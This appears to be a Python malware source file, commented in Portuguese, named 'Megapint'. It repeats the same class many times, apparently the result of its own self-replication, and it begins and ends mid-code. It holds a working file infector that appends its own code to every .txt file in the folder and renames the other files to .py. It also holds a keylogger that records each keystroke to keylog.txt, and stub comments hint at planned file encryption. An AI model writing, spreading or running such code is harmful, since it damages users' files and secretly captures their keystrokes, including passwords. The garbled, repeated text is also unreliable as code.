        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
